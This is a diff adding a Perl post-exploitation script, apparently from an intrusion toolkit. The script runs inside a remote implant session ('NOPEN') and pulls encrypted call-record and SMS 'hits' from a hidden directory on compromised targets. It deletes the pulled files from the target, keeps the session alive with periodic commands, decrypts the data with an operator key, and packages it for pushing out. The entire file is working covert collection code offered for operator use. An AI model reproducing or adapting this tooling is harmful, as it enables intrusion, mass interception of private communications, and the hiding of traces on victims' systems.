+#    my ($type,$inodes,$user,$group,$size,$monstr,
+#	$mday,$hm,$y,$filename,@morefilename)
+#      = split (/\s+/,$line);
+#    next unless ($type eq "-");
+#    if (@morefilename) {
+#      my ($newfilename) = $line =~ /\s($filename\s.*)/;
+#      $filename = $newfilename if (length $newfilename);
+#    }
+#    if (-f "$srcroot/$filename") {
+#      push (@ourfilespulled,$filename);
+#      $oldfilespulled{$filename}++;
+#    }
+#  }
+  my $filecount = @ourfilespulled;
+  my $plusmore = "";
+#UNUSED:
+#  $plusmore = "(which includes ".(scalar keys %oldfilespulled)." pulled previously)"
+#      if (scalar keys %oldfilespulled > 0);
+  if ($filecount) {
+    chdir($srcroot)
+      or mydie("Cannot cd to /current/down/$nopen_rhostname to decrypt");
+    if ($heredecrypt) {
+      mygetinput(".\nAbout to decrypt all $filecount files just pulled$plusmore,\n".
+		 "writing new .txt files to $collroot via:\n $COLOR_FAILURE\n\n".
+		 "  $cryptTool -i SRCFILE -o DSTFILE.txt -k $cryptkey -d -c -b\n\n".
+		 $COLOR_NORMAL.
+		 "where SRCFILE is from $srcroot\n".
+		 "and DSTFILE.txt will be put beneath\n".
+		 "$collroot.\n".
+		 "Original encrypted files will also be put there.\n\n".
+		 "A \"w\" will be done on target every 45 seconds until this is complete.\n\n".
+		 "Hit Return to continue."
+		);
+    } else {
+      mygetinput(".\nAbout to copy all $filecount encrypted files just pulled$plusmore\n".
+		 "to $collroot.\n\n".
+		 "As a test, the first one will be decrypted via:\n $COLOR_FAILURE\n\n".
+		 "  $cryptTool -i SRCFILE -o DSTFILE.txt -k $cryptkey -d -c -b\n\n".
+		 $COLOR_NORMAL.
+		 "\n\n".
+		 "A \"w\" will be done on target every 45 seconds until this is complete.\n\n".
+		 "Hit Return to continue."
+		);
+    }
+    my $runoutput = "";
+    my ($testfail,$testdone) = ();
+    my $whatted = "copied";
+    $whatted = "decrypted" if ($heredecrypt);
+    # 20100420: Same loop here does either decrypt or copy, defaults now to copy.
+    my $logext = "000";
+    while (-f "$logroot.$logext") {
+      $logext = sprintf("%03d",$logext + 1);
+    }
+    my $collext = "000";
+    while (-f "$collroot.$collext") {
+      $collext = sprintf("%03d",$collext + 1);
+    }
+    if ($logcountbefore or $collcountbefore) {
+      if ($logcountbefore) {
+	# For the logs, we don't care whether $host_dirpushed{$logroot}
+	# indicates old ones have been pushed or not, merging and pushing
+	# twice is no issue.
+	my ($ans) = mygetinput
+	  ("There are already $logcountbefore files in $logroot.\n\n".
+	   "You can set those aside to separate the new ones about to be downloaded from\n".
+	   "the old.  Even if they were already pushed up (we normally don't), it\n".
+	   "will not really matter if old and new logs are combined and then pushed--they.\n".
+	   "are read manually, anyways.\n\n".
+	   "Do you want to move\n".
+	   "       $logroot\n".
+	   "   to  $logroot.$logext?","N"
+	  );
+	if ($ans eq "y") {
+	  rename($logroot,"$logroot.$logext");
+	  `mkdir $logroot`;
+	  newhostvar("host_dirpushed{$logroot}",0);
+	}
+      }
+      if ($collcountbefore and $host_dirpushed{$collroot}) {
+	my ($ans) = mygetinput
+	  ("There are already $collcountbefore files in $collroot,\n".
+	   "and it appears they have already been pushed up (you should know if they were).\n\n".
+	   "You can set those aside to separate the new ones about to be downloaded from\n".
+	   "the old. But if you did not yet push the old, or you want to merge the old\n".
+	   "and new and push again, you can leave them where they are and the new ones\n".
+	   "will be combined with the old. They will then be pushed up together.\n\n".
+	   "Do you want to move\n".
+	   "       $collroot\n".
+	   "   to  $collroot.$collext?","N"
+	  );
+	if ($ans eq "y") {
+	  rename($collroot,"$collroot.$collext");
+	  `mkdir $collroot`;
+	  newhostvar("host_dirpushed{$collroot}",0);
+	}
+      }
+    }
+    $countdone = 0;
+    foreach my $remotepath (@ourfilespulled) {
+      my $srcfile = "$srcroot/$remotepath";
+      my $localsrcdir = dirname($srcfile);
+      my $localdestdir = "$collroot/".dirname($remotepath);
+      my $thisdecrypt = $heredecrypt;
+      my $thisislog = 0;
+      my $otherlogstr = 0;
+      foreach my $otherstr (@otherskipstrs) {
+	# Special case for one target, bb5e8 == log
+	$otherlogstr++
+	  if $remotepath =~ /$otherstr/;
+      }
+      if ($otherlogstr or
+	  $remotepath =~ /log/i) {
+	$thisislog++;
+	# per file decision, logs always decrypted
+	$thisdecrypt = 1;
+	$localdestdir = "$logroot/".dirname($remotepath);
+      }
+      my $newfile = basename($remotepath);
+      my ($tickleoutput,$nopenlines,@output) = tickleifneedbe(0,"w",45);
+      if ($runoutput or $tickleoutput or ($countdone and !($countdone % 300))) {
+	my $graphic = graphic(1+$countdone,$filecount,80);
+	$runoutput .= "\n\n" if $runoutput;
+	progprint("$COLOR_NORMAL\n".
+		  $runoutput.
+		  "$countdone of $filecount files $whatted\n".
+		  "$COLOR_SUCCESS\n$graphic");
+	$runoutput = "";
+      }
+      #do copy/decryption locally, make sure environment makes sense
+      unless (-d $localsrcdir and -f $srcfile and -s $srcfile) {
+	dbg("$prog ODD: $localsrcdir not a directory") unless (-d $localsrcdir);
+	dbg("$prog ODD: $srcfile not a file") unless (-f $srcfile);
+	dbg("$prog ODD: $srcfile is empty") unless (-s $srcfile);
+	mywarn("THIS IS ODD, REPORT IT:\n\n".
+	       "  (-d $localsrcdir and\n".
+	       "   -f $srcfile and\n".
+	       "   -s $srcfile)\n\n".
+	       "    THIS SHOULD BE TRUE AND IS NOT. Skipping this one:\n".
+	       "        $srcfile.");
+	sleep 3;
+	next;
+      }
+      $countdone++;
+      my $dbgmore = "";
+      unless (-d $localdestdir) {
+	$runoutput .= `mkdir -vp $localdestdir 2>&1`;
+	$dbgmore .= "mkdir -vp $localdestdir 2>&1\n";
+      }
+      # Rename() instead? No want this.
+      # We copy regardless of whether we decrypt or not
+      if (-f "$localdestdir/$newfile") {
+	chomp(my $test = `diff $srcfile $localdestdir/$newfile 2>/dev/null | wc -l`);
+	if ($test > 0) {
+	  preservefile("$localdestdir/$newfile");
+	} else {
+	  unlink("$localdestdir/$newfile");
+	}
+      }
+      copy($srcfile,"$localdestdir/$newfile")
+	or mydie("$prog cannot copy($srcfile,$localdestdir/$newfile): $!");
+      $newfile .= ".txt"
+	if $thisdecrypt;
+      # So if not decrypting here, we test only the one file, once tested we wipe
+      # the decrypted one, the other is still there as $newfile without $testext.
+    
+      # Remainder of loop is decrypting/testing
+      while ($thisdecrypt or !$testdone) {
+	my $testext = "";
+	$testext = ".test" if (!$thisdecrypt);
+	my $cmd = "$cryptTool -i $srcfile -o $localdestdir/$newfile$testext -k $cryptkey -d -c -b 2>&1";
+	my $runoutputnew = `$cmd`;
+	my $err = $?;
+	$runoutput .= $runoutputnew;
+	dbg("RUNNING locally via backticks:\n\n".
+	    $dbgmore."
+thisdecrypt=$thisdecrypt=
+heredecrypt=$heredecrypt=
+testdone=$testdone=\n\n\n".
+	    "$cryptTool -i $srcfile -o $localdestdir/$newfile$testext -k $cryptkey -d -c -b 2>&1".
+	    "\n\nGAVE OUTPUT:\n\n".
+	    $runoutputnew);
+	# Cannot do this, $err returned is > 0 even when it works right.
+	#      if ($err) {
+	##	my ($ans,$longans) = mygetinput
+	#	mydie
+	#	  (".$COLOR_FAILURE\n\n".
+	#	   "We have a problem with $cryptTool, ERR=$err was returned running:\n".
+	#	   "$COLOR_NORMAL\n".
+	#	   "$cmd\n\n".
+	#	   "You may be able to fix this manually."
+	##	   "We might be able to fix this. Enter a new key to try (all hex):"
+	#	  );
+	#      }
+	last if (!$thisdecrypt and $testdone);
+	unless ($testdone) {
+	  my $test = `file $localdestdir/$newfile$testext`;
+	  $test =~ s,\s*$,,g;
+	  # Sometimes file gets confused, if top line looks right we override file's results.
+	  unless ($test =~ /ascii/i) {
+	    #TODO: This test is coming up as some picture crap, find a better testing method
+	    #example: exec=CURSEHYDRANT; ver=6.1.0.2; os=HP-UX B.11.00
+	    chomp(my $head = `head -1 $localdestdir/$newfile$testext`);
+	    my ($a,$b,$c,) = $head =~ /^\#exec=(\S+).*ver=(\S+).*os=(\S+)/;
+	    $test = "ascii" if ($a and $b and $c);
+	  }
+	  if ($test =~ /ascii/i) {
+	    $testdone++;
+	    dbg("$prog decrypted $test");
+	    unless ($thisdecrypt) {
+	      # So if not decrypting here, we test only the one file, once tested we wipe
+	      # the decrypted one, the other is still there as $newfile without $testext.
+	      unlink("$localdestdir/$newfile$testext");
+	      last;
+	    }
+	    if ($testfail) {
+	      mygetinput("file $localdestdir/$newfile$testext\n".
+			 $test.
+			 "head -5  $localdestdir/$newfile$testext\n".
+			 `head -5  $localdestdir/$newfile$testext`.
+			 "\n\nThis key worked. Press Enter to continue.");
+	    }
+	  } else {
+	    $testfail++;
+            my $oldkey = $cryptkey;
+	    my ($ans,$longans) = mygetinput
+	      (".$COLOR_FAILURE\n\nWe$COLOR_NOTE MAY$COLOR_FAILURE have a problem with $cryptTool, ERR=$err was returned running:\n$COLOR_NORMAL\n".
+	       "$cmd\n\n".
+	       "Worse, \"file  $localdestdir/$newfile$testext\" reports:\n\n".
+	       $test."\n\n".
+	       "This is NOT expected, but we might be able to fix this if that was the wrong key.\n".
+	       "Can you provide the right key?\n\n".
+	       "Choose one of:\n".
+	       "   - Enter a key (if you enter the same key, you can try another cryptTool binary);\n".
+	       "   - Enter ABORT (we stop $prog entirely);or \n".
+	       "   - Enter GOAHEAD (we continue and ignore this from now on).\n\n".
+	       "Your answer:"
+	      );
+	    $cryptkey = $longans
+	      if ($longans =~ /^[a-f0-9]+$/);
+	    if ($longans eq "ABORT") {
+	      chomp(my $listing = `ls -al $collroot $logroot 2>/dev/null`);
+	      mydie((length $listing
+		     ? ("If you run $prog again, this data will still be there to push later:\n\n".
+			"ls -al $collroot $logroot:\n".$listing.
+			"\n\n")
+		     : ("")
+		    ).
+		    "User aborted");
+	    } elsif ($longans eq "GOAHEAD") {
+	      $testdone++;
+	    } elsif ($cryptkey eq $oldkey) {
+	      my $listing = "\n\n".`find /share/ /mnt/ $opbin -type f -name "cryptTool*" -ls 2>/dev/null | lss`;
+	      my ($ans,$longans) = mygetinput
+		($listing.
+		 "\n\nEnter the full path (or triple click an entire line above) to a different cryptTool binary:\n"
+		);
+	      $longans = $1 if
+		$longans  =~
+		  m,(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+\d+\s+\d{4}\s+(/.+),;
+	      if (-f $longans and -x _) {
+	        $cryptTool = $longans;
+	      }
+	    }
+	  }
+	}
+	last if ($thisislog and $testdone);
+      }
+    }
+    mydie("NO FILES DECRYPTED HOW CAN THIS HAPPEN?") unless ($countdone);
+    # rmdir only removes if empty, ignore error
+    `rmdir $collroot $logroot 2>/dev/null`;
+  }
+  my $stamp = timestamp(short);
+  my $alsodecrypted = " encrypted";
+  $alsodecrypted = " encrypted AND decrypted" if $heredecrypt;
+  if ($projectname and ($forcepack or $countpulledbefore or $countdone)) {
+    #Will tar all decrypted collection, data in one file, logs in another
+    if (-d $collroot) {
+      chomp($collcountafter = `find $collroot -type f | wc -l`);
+      chomp($logcountafter = `find $logroot -type f | wc -l`);
+      copy($keyfile,$collroot);
+      my $prefix = "cdrhits";
+      $prefix .= ".$projectname" if $projectname;
+      progprint(".\n".
+		"$COLOR_FAILURE\n".
+		"$prog will now tar all$alsodecrypted data. If more than\n".
+		"one run of $prog is used, the final tarball pushed will contain\n".
+		"data from ALL runs on $nopen_rhostname. You can answer NO\n".
+		"when copy-fast asks you about pushing if you know FOR SURE you will\n".
+		"be running this again later this op.\n\n".
+		"The file pushed will contain \"$prefix\".\n".
+		"(but copy-fast will insert a timestamp in it)");
+      tickleifneedbe(0,"w",45);
+      my @packdir = ("./");
+      newhostvar("host_dirpushed{$logroot}",1);
+      newhostvar("host_dirpushed{$collroot}",1);
+      offerball($forcepush,"$prefix.","",$collroot,\@packdir);
+      sleep 3 if (-d $logroot);
+    }
+    if (-d $logroot) {
+      copy($keyfile,$logroot);
+      my $prefix = "cdrlogs";
+      $prefix .= ".$projectname" if $projectname;
+      progprint(".\n".
+		"$COLOR_FAILURE\n".
+		"$prog will now tar all log data (encrypted and decrypted). If more than\n".
+		"one run of $prog is used, the final tarball pushed will contain\n".
+		"data from ALL runs on $nopen_rhostname. You can answer NO\n".
+		"when copy-fast asks you about pushing if you know FOR SURE you will\n".
+		"be running this again later this op.\n\n".
+		"The file pushed will contain \"$prefix\".\n".
+		"(but copy-fast will insert a timestamp in it)");
+      tickleifneedbe(0,"w",45);
+      my @packdir = ("./");
+      offerball($forcepush,"$prefix.","",$logroot,\@packdir);
+    }
+  } else {
+    mywarn("NO DATA COLLECTED so NONE PUSHED!!");
+  }
+}#packitup
+
+
+# SUBROUTINES
+
+sub sortlistingonsize {
+  # Given file listing array, return array sorted on size
+  local (@listing) = (@_);
+  # Hash of strings, $sizehash{size} = all entries in @listing
+  # (concatenated with newline) of that size.
+  my %sizehash = () ;
+  foreach (@listing) {
+    chomp;
+    my ($size,$month,$path) = 
+      m,^.*\s+(\d+)\s+(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec).*\d{4}\s+(/.*)$, ;
+    $sizehash{$size} .= "\n"
+      if ($sizehash{$size});
+    $sizehash{$size} .= "$_";
+  }
+  my @retval = ();
+  foreach my $size (sort by_num keys %sizehash) {
+    push(@retval,split(/\n/,$sizehash{$size}));
+  }
+  return @retval
+}
+
+## BELOW MAYBE USE LATER BUT NOT USED NOW
+
+
+createtarball_getcdrhits(); # this exits if they say no.
+mymydie
+  ("\n\n".
+   "Creating this archive in the background:\n\n".
+   "   $newball"
+  );
+
+
+## END MAIN ##
+
+sub createtarball_getcdrhits {
+  my $todaystamp = timestamp(short);
+  my $newball = "${nopen_rhostname}_${todaystamp}.tar.bz2";
+  my ($ans) = mygetinput
+    ($COLOR_NOTE.
+     "$prog is done processing:\n$COLOR_FAILURE\n\t".join("\n\t",@paths).
+     "\n$COLOR_NOTE\n".
+     "See $destdir for local data.\n\n".
+     "You can now create a fresh tarball in $opdir of the target data called:\n".
+     "   $newball\n\n".
+     "Do you want to create it?",
+     "Y"
+    );
+  mymydie
+    ("\n\n".
+     "ls -alrtR $destdir\n".
+     `cd $destdir ; ls -arltR`."\n$COLOR_FAILURE\n".
+     "$prog is done.\n\n".
+     "Data can be found locally (see listing above) but NOT in a tarball yet.\n".
+     "Here is a pastable to make one:\n\n".
+     "cd $destdir ; tar cvjf $opdir/$newball .\n\n"
+    ) unless ($ans eq "y");
+
+  # If we continue, fork, parent creates tarball in background, 
+  # child exits  # If they wanted the tarball, fork/close here releases the 
+  # NOPEN window that called us, we popup an xterm once tarball
+  # is done.
+  return if fork;
+  close(STDOUT);
+  close(STDIN);
+  close(STDERR);
+  close($socket);
+  my $taroutfile = "$optmp/.autogetcdrhits.$$";
+  my $tarcmd = "cd $destdir ; tar cvjf $opdir/$newball . 2>&1";
+  if (open(OUT,"> $taroutfile")) {
+    print OUT
+      "\n\n".
+      $COLOR_FAILURE.
+      gmtime().
+      "\n\nNow tarring up the results with:\n\n".
+      $COLOR_NOTE.
+      $tarcmd."\n\n".
+      $COLOR_NORMAL.
+      " made by: $prog $origargs\n".
+      "      on: $nopen_rhostname\n\n".
+      "Verbose tar output will follow when it is done:\n\n";
+    close(OUT);
+    if (fork()) {
+      exec("xterm -title autogetcdrhits_${nopen_hostonly}_now_building_$newball".
+	   "-ut +cm +cn -sk -sb -sl 15000 -geometry 68x67+720+26 -e tail -50f $taroutfile");
+      exit;
+    }
+    sleep 2;
+    if (open(OUT,">> $taroutfile")) {
+      if (open(GETCDRHITSIN,"$tarcmd |")) {
+	while (<GETCDRHITSIN>) {
+	  print OUT;
+	}
+	close(GETCDRHITSIN);
+      }
+      print OUT "\n\n".gmtime()."\n\n$tarcmd\n\nCommand is done:\n\n".
+	`cd $opdir ; ls -alrth $newball`.
+	$COLOR_FAILURE."\n\n".
+        "(close this window with Ctrl-C anytime.)\n$COLOR_NORMAL\n";
+      close(OUT);
+    }
+  }
+}#createtarball
+
+sub myinit {
+  $willautoport=1;
+  my $autoutils = "../etc/autoutils" ;
+  unless (-e $autoutils) {
+    $autoutils = "/current/etc/autoutils" ;
+   }
+  require $autoutils;
+  $prog = "-gs getcdrhits";
+  $vertext = "$prog version $VER\n" ;
+  mydie("No user servicable parts inside.\n".
+	"(I.e., noclient calls $prog, not you.)\n".
+	"$vertext") unless ($nopen_rhostname and $nopen_mylog and
+			    -e $nopen_mylog);
+
+  $usagetext="
+Usage: $prog [-h]                       (prints this usage statement)
+
+NOT CALLED DIRECTLY
+
+$prog is run from within a NOPEN session when \"$prog\" or
+\"=getcdrhits\" is used.
+
+";
+
+  my $destdir_tmp = "$opdown/\$nopen_rhostname/via-gs.getcdrhits";
+  $destdir = "$opdown/$nopen_rhostname/via-gs.getcdrhits";
+  $destdirname = "$nopen_rhostname/via-gs.getcdrhits";
+
+  $bailfile = "$optmp/BAILGETCDRHITS.$$";
+
+  @defpaths = ("er*/aux_*/output/final",
+	       "er*/out/f");
+  @deflogpath = ("er*/logs/final",
+		 "er*/log/f");
+  
+  $gsusagetext="
+Usage: $prog [options] [HIDDENPATH/TO/REMOTE/FILE-OR-DIR [PATH/2 ..]]
+
+$prog handles tasking and collection for targets running ER and one
+or more parsers.  For targets where only argfile tasking is needed, after
+the argfiles are handled you have an opportunity to abort before any
+collection begins (or you can use the -t/Task only option).
+
+$prog first looks for your argfile in $opdir and /mnt/zip. If it
+finds one, it prompts with that as the default. When given an argfile to to
+process, it is encrypted and uploaded. You are then prompted which directories
+to put it in and how many start actions are in each. (Enter \"none\" to skip
+argfile tasking entirely.)
+
+$prog then uses -ls and -get to find and then pull all CDR** hits
+found in the target's STOIC or INCISION hidden directory. It then removes the
+target files it just pulled.
+
+** We generically use the term CDR here and in the filename pushed, but the
+data collected may be some subset of several varieties (e.g., cdr, sms, etc.),
+the exact nature of which is immaterial here.
+
+If none are provided, the target paths retrieved will be:
+
+";
+  foreach $thispath(@defpaths) {
+    $gsusagetext .= "    $thispath\n";
+  }
+  $gsusagetext .= "
+OPTIONS
+ -h/-v      Show usage/version
+ -O         Perform decryption locally (defaults to elsewhere now)
+ -L paths   \",,\" delimited list of ENEMYRUN log locations
+            (relative to the hidden dir)                       [@deflogpath]
+ -s N,M     Split the pull M ways, this window is N of M. Lets several windows
+            share the load. The 1,M instance will provide pastables for you to
+            run the other instances. The files are split fairly evenly by size,
+            each instance taking a large then a small file until the list is
+            exhausted. Use M between 3-5 for best performance.
+ -l list    List of remote PATHS to getcdrhits (blank/#comment lines ignored)
+ -b exprs   Blacklist: getcdrhits will NOT pull/delete files matching these
+            regular expressions (skip files that match), for each expr given
+            (\",,\" delimited, no whitespace)
+ -d dir     Source directory on target (default is STOIC hidden directory)
+ -D key     Decrypt key (required) (Must use key the parser is running with)
+ -T proj    Project, used in the tarball filename created/pushed. (required)
+ -F         Force re-pulls of files pulled in previous $prog instance
+ -t         Perform argfile tasking only, without collection.
+ -M max     Set the max (in MB) we allow our bwmonitor to reach, downloads
+            will stop when we reach that level. (default is unlimited)
+
+Usage: $prog [options] [HIDDENPATH/TO/REMOTE/FILE-OR-DIR [PATH/2 ..]]
+
+";
+
+  my $notused = "
+ -U           Do NOT re-use the target -ls of this/these PATHs if done
+              before. Use -U if you want to collect data newer than the first
+              run of $prog, if any.
+";
+  mydie("bad option(s)") if (! Getopts( "hvl:d:L:b:D:T:Os:a:tFM:" ) ) ;
+  ($bwmax,$maxdownload) = ();
+  if ($opt_M > 0 and $opt_M =~ /^\d+$/) {
+    $bwmax = "MAXDOWNLOAD=$opt_M";
+    $maxdownload = $opt_M;
+  }
+  $forcereget = defined $opt_F ? "FORCEREGET" : "";
+#  my $reusels = defined $opt_U ? "U" : "";
+  $taskonly = $opt_t;
+
+  my $def_a = "adm1";
+  $argname = defined $opt_a ? $opt_a : $def_a;
+  mydie("-a $opt_a cannot contain /")
+    if ($argname =~ m,/,);
+
+  if ($listfile = $opt_l) {
+    mydie("-l $listfile must be a local file listing remote paths")
+      unless (-f $listfile and -s $listfile);
+  }
+  if ($skipexpr = $opt_b) {
+    mydie("-b \"$skipexpr\" cannot contain whitespace")
+      if $skipexpr =~ /\s/;
+    my @exprs = split(/,,/,$skipexpr);
+    $skipexpr = "";
+    foreach (@exprs) {
+      $skipexpr .= "\|$_";
+    }
+  }
+  mydie("-s $opt_s not valid, must be 0 < N <= M")
+    unless (!$opt_s or
+	    ($opt_s =~ /^(\d+),(\d+)$/ and $1 <= $2 and $1 > 0));
+  ($mysplitpart,$splitcount) = ($1,$2) if $opt_s;
+  $mysplitpart = 1 unless $mysplitpart;
+  $skipexpr =~ s/^\|//;
+  usage() if ($opt_h or $opt_v);
+  $olddatafile = $opt_f;
+#dbg("verbose=$verbose= opt_V=$opt_V");
+
+  $socket = pilotstart(quiet);
+
+  if ($opt_d) {
+    $srcdir = $opt_d;
+  } else {
+    my @multiplehidden = ();
+    ($srcdir) = gethiddendir(0,0,\@multiplehidden);
+    if (@multiplehidden > 1) {
+      my %multiplehidden = ();
+      foreach (@multiplehidden) {
+	$multiplehidden{$_}++;
+      }
+      my $default = "";
+      foreach my $dir (@multiplehidden) {
+	my ($output,$noutput,@lines) =
+	  doit("-ls -d $dir/er*");
+	next unless $output;
+	$default = $dir;
+      }
+      my $more = "";
+      $more = "\nAt least one seems to have er* directories (see above)."
+	if $default;
+      while (1) {
+	my ($ans,$longans) = mygetinput
+	  ("There are multiple STOIC-style directories.$more\n\n".
+	   "Enter ABORT here to abort.\n\n".
+	   "Which should we use?",$default);
+	mydie("User aborted") if ($ans eq "a");
+	if ($multiplehidden{$ans}) {
+	  $srcdir = $longans;
+	  last;
+	}
+	$more = "You must enter one of the hidden directories.\n\n$more"
+	  unless ($more =~ /You must enter/);
+      }
+    }
+    ($srcdir2) = ($srcdir);
+    mydie("Hidden directory not found, use -d to point\n".
+	  "to directory data can be found in.")
+      unless $srcdir;
+  }
+  if ($opt_D) {
+    $cryptkey = $opt_D;
+    mydie("-D $cryptkey is not a string of hex digits")
+	unless ($cryptkey =~ /^[a-f0-9]+$/);
+  } else {
+    mydie("-D KEY is now a required field");
+  }
+  $heredecrypt = $opt_O;
+  if ($opt_T) {
+    $projectname = $opt_T;
+  } else {
+    mydie("NEW: -T PROJECTNAME is now required.");
+  }
+  $forcepush = 1 if $projectname;
+
+  if ($opt_L) {
+    @remotelogpath = split(",,",$opt_L);
+  } else {
+    @remotelogpath = @deflogpath;
+  }
+   
+  if (@ARGV) {
+    @remotepaths = @ARGV;
+  } else {
+    @remotepaths = @defpaths;
+  }
+  if ($listfile) {
+    if (open(GETCDRHITSIN,$listfile)) {
+      while (<GETCDRHITSIN>) {
+	s/^\s*//;
+	s/\s*$//;
+	next if /^#/;
+	push(@remotepaths,$_) if $_;
+      }
+      close(GETCDRHITSIN);
+    } else {
+      mydie("Cannot open $listfile");
+    }
+  }
+  @remotepaths = uniqify_array(@remotepaths);
+} #myinit
+
